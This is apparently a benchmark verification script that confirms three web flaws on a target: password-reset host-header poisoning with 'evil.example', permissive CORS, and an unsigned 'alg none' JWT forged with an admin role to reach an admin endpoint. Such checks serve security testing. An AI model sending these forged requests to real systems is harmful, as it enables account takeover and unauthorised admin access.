#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
reset=$(curl -sf -X POST "$TARGET/api/v1/auth/reset" -H 'host: evil.example' -H 'content-type: application/json' -d '{"email":"user1@bench.local"}')
printf '%s' "$reset" | grep -q 'evil.example'
cors=$(curl -s -i -H 'origin: https://evil.example' "$TARGET/api/_verify/health")
printf '%s' "$cors" | grep -qi 'access-control-allow-origin: https://evil.example'
uid=$(user_id user1@bench.local)
header=$(b64url '{"alg":"none","typ":"JWT"}')
payload=$(b64url "{\"sub\":$uid,\"role\":\"admin\"}")
curl -sf -H "authorization: Bearer $header.$payload." "$TARGET/api/v1/admin/summary" | grep -q 'adminSummary'
